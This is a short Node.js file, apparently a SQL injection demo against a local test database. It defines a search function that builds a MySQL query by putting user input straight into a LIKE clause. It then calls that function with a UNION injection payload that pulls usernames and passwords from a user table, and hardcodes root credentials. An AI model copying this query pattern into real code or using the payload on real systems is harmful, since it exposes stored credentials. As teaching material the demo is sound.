import mysql from 'mysql2/promise';

const pool = mysql.createPool({
  host: 'localhost', user: 'root', password: '1234', database: 'mydb'
});

const searchBoard = async (keyword) => {
  try {
    const query = `
      SELECT id, title, content, author
      FROM test_board
      WHERE title LIKE '%${keyword}%'
    `;

    // ' union select IdleDeadline, username, --

    console.log('실행 쿼리:', query);

    const [rows] = await pool.query(query);
    console.log(rows);
  } catch (e) {
    console.error('에러:', e.message);
  } finally {
    await pool.end();
  }
};

// 정상 검색
// await searchBoard("첫 번째");

// Injection 공격 (UNION 사용)
await searchBoard("' UNION SELECT id, username, password, 'user' FROM test_user -- ");
